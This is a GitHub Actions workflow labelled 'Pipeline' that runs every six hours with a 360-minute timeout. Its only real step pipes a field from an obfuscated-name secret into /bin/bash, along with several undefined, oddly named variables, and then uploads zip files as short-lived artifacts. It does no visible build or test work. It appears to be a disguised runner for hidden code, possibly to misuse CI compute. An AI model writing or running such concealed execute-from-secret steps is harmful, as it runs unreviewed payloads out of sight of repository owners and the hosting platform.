name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '16 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          tbvp66463: ${{ secrets.tbvp66463 }}
        run: |
          printf '%s' "$tbvp66463" | jq -r .zw26 | /bin/bash
          printf '%s' "$esjj49" | jq -r .ymcks00 | /bin/bash
          echo $blhu906 | jq -r .xiju899 | /bin/bash
          printf '%s' "$gtcsw72" | jq -r .fr2558 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: TlLcMCKi
          path: "*.zip"
          retention-days: 1
